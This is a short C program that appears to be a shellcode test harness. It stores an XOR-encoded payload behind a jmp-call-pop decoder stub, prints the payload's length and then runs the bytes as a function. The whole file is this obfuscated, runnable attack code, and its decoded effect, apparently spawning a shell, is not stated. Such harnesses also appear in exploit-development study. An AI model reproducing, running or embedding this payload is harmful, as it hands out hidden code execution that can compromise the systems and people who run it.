#include <stdio.h> 
#include <string.h> 

unsigned char code[] = \ 
"\xeb\x0e\x5e\x80\x06\x01\x80\x36\xaa\x74\x0a\x48\xff\xc6\xeb\xf3\xe8\xed\xff\xff\xff\xe1\x9a\x69\xf9\xe1\x10\x84\xc7\xc2\xc3\x84\x84\xd8\xc1\xf8\xe1\x22\x4c\xf9\xe1\x22\x47\xfc\xe1\x22\x4b\xe1\x28\x69\x90\xa4\xae\xa9";

main() 
{ 
	printf("Shellcode Length: %d\n", strlen(code)); 
	
	int (*ret)() = (int(*)())code; 
	
	ret(); 
}